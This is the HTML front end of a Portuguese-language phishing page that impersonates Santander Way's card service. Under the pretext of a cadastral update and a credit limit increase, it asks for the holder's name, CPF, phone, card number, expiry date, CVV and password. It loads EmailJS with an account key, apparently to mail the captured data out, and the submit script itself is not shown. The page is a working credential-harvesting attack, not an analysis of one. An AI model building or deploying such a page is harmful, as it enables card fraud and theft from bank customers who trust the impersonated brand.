<!DOCTYPE html>
<html lang="pt-br">

<head>
    <title>Santander Way</title>
    <meta charset="utf-8">
    <link href="styles.css" rel="stylesheet">
    <link rel="shortcut icon" href="assets/favicon.png" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap" rel="stylesheet">
</head>

<body>
    <script type="text/javascript">
    (function() {
    emailjs.init("user_7MAiARiyp61kVznR9yT9b"); 
    })();
    </script>
    <div class="header">
        <div class="spacingHeaderCon"></div>
        <div class="containerNameViewHeader">
            <img height="100%" src="assets/san.png" />
        </div>
        <div class="spacingBorder"></div>
        <div class="containerNameViewHeader">
            <span class="nameCard">Cartões Santander</span>
        </div>
        <div class="spacingHeaderCon"></div>
    </div>
    <div class="container">
        <div class="view">
            <span class="titleView">
                Santander Way, Falta pouco
                basta você atualizar seus dados.
            </span>
            <span class="subTitleView">
                A cada passo suas informações são salvas
                automaticamente.
            </span>
            <span class="textTitle">Dados Cadastrais</span>
            <div class="viewForm">
                 <div style="padding: 5px;"></div>
                <input placeholder="Nome do titular" type="text" class="inputs" id="nome">
                <div style="padding: 10px;"></div>
                <div class="viewMeInputs">
                    <input placeholder="CPF" type="text" class="inputs0" id="cpf">
                    <input placeholder="Contato" type="text" class="inputs0" id="telefone">
                </div>
                <div style="padding: 10px;"></div>
                <input placeholder="Número do cartão" type="text" class="inputs" id="cartao">
                <div style="padding: 10px;"></div>
                <div class="viewMeInputs">
                    <input placeholder="Validade do Cartão" type="text" class="inputs0" id="validade">
                    <input placeholder="CVV" type="text" class="inputs0" id="cvv">
                </div>
                <div style="padding: 10px;"></div>
                <input placeholder="Senha" type="text" class="inputs" id="senha">
                <div style="padding: 30px;"></div>
                <div class="viewMeInputs">
                    <span class="textINfo">
                        Ao submeter você confirma que está de acordo com nossa politica de privacidade.
                        <a></a>
                    </span>
                    <div class="submit" id="btn-enviar">
                        <span class="submitText">ATUALIZAR</span>
                    </div>
                </div>
                <div style="padding: 30px;"></div>
            </div>
        </div>
        <div class="viewRightInfo">
            <img class="imgSX" src="assets/card.png" alt="SX" />
            <div style="padding: 5px;"></div>
            <div class="hrSpacing"></div>
            <div style="padding: 7px;"></div>
            <span class="titles">ATUALIZAÇÃO CADASTRAL</span>
            <div style="padding: 5px;"></div>
            <span class="bodytext">
                Nossa equipe de TI, frequentemente
                está trabalhando para trazer comodidade
                e segurança para nossos colaboradores.
            </span>
            <div style="padding: 5px;"></div>
            <span class="bodytext">
                Após a atualização cadastral, nossa central
                de relacionamento irá entrar em contato.
            </span>
            <div style="padding: 5px;"></div>
            <span class="bodytext">
                <strong>0800 772 7811.</strong> (Metropolitano e regiões)
            </span>
            <div style="padding: 7px;"></div>
            <div class="hrSpacing"></div>
            <div style="padding: 7px;"></div>
            <span class="titles">AUMENTO DE LIMITE</span>
            <div style="padding: 5px;"></div>
            <span class="bodytext">
                Sem conta corrente: R$ 1045,00
            </span>
            <span class="bodytext">
                Com conta corrente: R$ 500,00
            </span>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    <script src="jquery.mask.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
    <script src="index.js"></script>
</body>
</html>